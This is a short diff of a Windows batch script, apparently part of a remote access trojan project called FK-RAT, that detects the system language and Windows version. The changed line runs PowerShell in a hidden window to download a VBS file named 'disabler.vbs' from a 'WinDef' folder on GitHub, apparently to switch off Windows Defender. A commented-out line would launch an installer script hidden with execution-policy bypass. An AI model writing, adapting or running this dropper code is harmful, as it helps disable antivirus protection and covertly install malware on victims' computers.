@@ -40,5 +40,5 @@ FOR /F %%i IN ('powershell [Environment]::OSVersion[0].Version.Major) DO (
 )
 echo %LANG%
 echo %WINVER%
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/WinDef/%WINVER%/Win_en.vbs -OutFile disabler.vbs"; 
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/WinDef/%WINVER%/Win10_en.vbs -OutFile disabler.vbs"; 
 REM powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
